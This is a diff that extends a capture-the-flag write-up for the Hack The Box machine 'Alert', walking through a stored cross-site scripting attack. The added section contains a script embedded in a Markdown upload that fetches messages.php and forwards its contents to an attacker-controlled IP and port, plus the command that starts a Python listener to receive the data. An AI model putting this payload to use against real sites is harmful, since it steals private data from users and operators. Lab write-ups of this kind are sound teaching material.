@@ -198,3 +198,43 @@ Well, that worked as intended. One of the tools to look at for ideas on initial 
 ![](./.images/Screenshot_Alert-MD-5.png)
 
 ![](./.images/Screenshot_Alert-MD-6.png)
+
+Neat, well that tells us that we can try to inject some cross site scripting code. Although we don't want to execute it, we need someone with permissions to. Let's see if we can figure that out. We'll make a file called XSS.md. This file will contain the following:
+
+```
+<script>
+fetch("http://alert.htb/messages.php")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.29:1337/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+```
+
+Don't forget to change the IP address to match your needs. Before we upload this one, we'll want to make a small python web-server.
+
+```
+sudo python3 -m http.server 1337
+```
+
+Don't forget to make the port match the one in the XSS.md file.
+
+![](./.images/Screenshot_Alert-XSS-1.png)
+
+![](./.images/Screenshot_Alert-XSS-2.png)
+
+![](./.images/Screenshot_Alert-XSS-3.png)
+
+![](./.images/Screenshot_Alert-XSS-4.png)
+
+![](./.images/Screenshot_Alert-XSS-5.png)
+
+
+
+
+
+
+
+
+
+
